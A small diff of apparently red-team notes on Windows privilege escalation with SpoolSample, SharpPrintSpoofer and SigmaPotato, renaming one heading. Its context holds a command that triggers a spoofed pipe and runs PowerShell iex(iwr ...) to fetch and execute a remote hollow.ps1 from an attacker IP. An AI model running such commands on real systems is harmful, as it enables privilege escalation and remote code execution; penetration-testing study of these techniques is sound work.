@@ -18,7 +18,7 @@ Once SharpPrintSpoofer is listening, trigger the pipe with SpoolSample:
 Transfer to victim and run:
 - `SpoolSampleModified.exe <hostname> <hostname>/pipe/test "C:\Windows\System32\cmd.exe /c powershell iex(iwr http://192.168.45.195/hollow.ps1 -useb)"`
 
-### Usage from Memory via .NET Reflection with SigmaPotato
+### Method 3 - .NET Reflection with SigmaPotato
 
 Load from a Remotely Hosted Binary via a WebClient:
 ```
